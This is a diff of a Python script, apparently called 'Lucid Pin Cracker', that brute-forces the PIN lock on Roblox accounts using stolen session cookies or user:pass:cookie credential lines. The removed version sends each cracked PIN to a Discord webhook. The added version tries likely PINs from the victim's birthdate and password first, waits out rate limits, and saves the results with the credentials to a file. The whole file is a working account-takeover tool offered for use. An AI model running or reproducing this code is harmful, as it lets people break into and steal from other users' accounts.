@@ -1,103 +1,74 @@
-import requests
-import re
-import string
-import time
-import os
+import os, time, requests
+from threading import Thread
+from datetime import datetime
 
-pingEveryone = True
-print('')
-print('Enter your cookie below:')
-cookie = input()
-os.system("cls")
-print('')
-print('Enter your webhook below:')
-webhook = input()
-os.system("cls")
-print('')
-print('Should we ping Everyone?: ( y / n )')
-pingEveryone = input()
-os.system("cls")
-if pingEveryone.lower == 'y' or pingEveryone == 'yes':
-    ping = '@everyone'
+credentials = input('Enter the account user:pass:cookie or cookie ~ ')
+if credentials.count(':') >= 2:
+    username, password, cookie = credentials.split(':',2)
 else:
-    ping = '***Pin Cracked!***'
-os.system("cls")
+    username, password, cookie = '', '', credentials
+os.system('cls')
 
-print('''
-  ██╗     ██╗   ██╗ █████╗ ██╗██████╗   ██████╗ ██╗███╗  ██╗
-  ██║     ██║   ██║██╔══██╗██║██╔══██╗  ██╔══██╗██║████╗ ██║
-  ██║     ██║   ██║██║  ╚═╝██║██║  ██║  ██████╔╝██║██╔██╗██║
-  ██║     ██║   ██║██║  ██╗██║██║  ██║  ██╔═══╝ ██║██║╚████║
-  ███████╗╚██████╔╝╚█████╔╝██║██████╔╝  ██║     ██║██║ ╚███║
-  ╚══════╝ ╚═════╝  ╚════╝ ╚═╝╚═════╝   ╚═╝     ╚═╝╚═╝  ╚══╝
+req = requests.Session()
+req.cookies['.ROBLOSECURITY'] = cookie
+try:
+    username = req.get('https://www.roblox.com/mobileapi/userinfo').json()['UserName']
+    print('Logged in to', username)
+except:
+    input('INVALID COOKIE')
+    exit()
 
-   █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
-  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
-  ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
-  ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
-  ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
-   ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n''')
+common_pins = req.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv').text
+pins = [pin.split(',')[0] for pin in common_pins.splitlines()]
+print('Loaded pins by commonality.')
 
-url = 'https://auth.roblox.com/v1/account/pin/unlock'
-token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
-xcrsf = (token.headers['x-csrf-token'])
-header = {'X-CSRF-TOKEN': xcrsf}
+r = req.get('https://accountinformation.roblox.com/v1/birthdate').json()
+month = str(r['birthMonth']).zfill(2)
+day = str(r['birthDay']).zfill(2)
+year = str(r['birthYear'])
 
-i = 0
+likely = [username[:4], password[:4], username[:2]*2, password[:2]*2, username[-4:], password[-4:], username[-2:]*2, password[-2:]*2, year, day+day, month+month, month+day, day+month]
+likely = [x for x in likely if x.isdigit() and len(x) == 4]
+for pin in likely:
+    pins.remove(pin)
+    pins.insert(0, pin)
+print(f'Prioritized likely pins {likely}\n')
 
-for i in range(9999):
+tried = 0
+while 1:
+    pin = pins.pop(0)
+    os.system(f'title Pin Cracking {username} ~ Tried: {tried} ~ Current pin: {pin}')
     try:
-        pin = str(i).zfill(4)
-        payload = {'pin': pin}
-        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
-        if 'unlockedUntil' in r.text:
-            print(f'Pin Cracked! Pin: {pin}')
-            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
-            data = {
-                "content" : ping,
-                "username" : "Lucid Pin Cracker",
-                "avatar_url" : "https://cdn.discordapp.com/attachments/857646271433801748/861595357778804756/lucidicon.png"
-            }
-            data["embeds"] = [
-                {
-                    "description" : f"{username}\'s Pin:\n```{pin}```",
-                    "title" : "Cracked Pin!",
-                    "color" : 0x00ffff,
-                }
-            ]
-
-            result = requests.post(webhook, json = data)
-            input('Press any key to exit')
+        r = req.post('https://auth.roblox.com/v1/account/pin/unlock', json={'pin': pin})
+        if 'X-CSRF-TOKEN' in r.headers:
+            pins.insert(0, pin)
+            req.headers['X-CSRF-TOKEN'] = r.headers['X-CSRF-TOKEN']
+        elif 'errors' in r.json():
+            code = r.json()['errors'][0]['code']
+            if code == 0 and r.json()['errors'][0]['message'] == 'Authorization has been denied for this request.':
+                print(f'[FAILURE] Account cookie expired.')
+                break
+            elif code == 1:
+                print(f'[SUCCESS] NO PIN')
+                with open('pins.txt','a') as f:
+                    f.write(f'NO PIN:{credentials}\n')
+                break
+            elif code == 3 or '"message":"TooManyRequests"' in r.text:
+                pins.insert(0, pin)
+                print(f'[{datetime.now()}] Sleeping for 5 minutes.')
+                time.sleep(60*5)
+            elif code == 4:
+                tried += 1
+        elif 'unlockedUntil' in r.json():
+            print(f'[SUCCESS] {pin}')
+            with open('pins.txt','a') as f:
+                f.write(f'{pin}:{credentials}\n')
             break
-            
-        elif 'Too many requests made' in r.text:
-                
-            print('  Ratelimited, trying again in 60 seconds..')
-            time.sleep(60)
-                
-        elif 'Authorization' in r.text:
-                
-            print('  Error! Is the cookie valid?')
-            break
-            
-        elif 'Incorrect' in r.text:
-            print(f"  Tried: {pin} , Incorrect!")
-            time.sleep(10)  
-    except:
-        print('  Error!')
-    
-input('\n  Press any key to exit')
-        
+        else:
+            pins.insert(0, pin)
+            print(f'[ERROR] {r.text}')
+    except Exception as e:
+        print(f'[ERROR] {e}')
+        pins.insert(0, pin)
 
-
-        
-
-
-
-    
-        
-            
-        
-
-
-
+input()
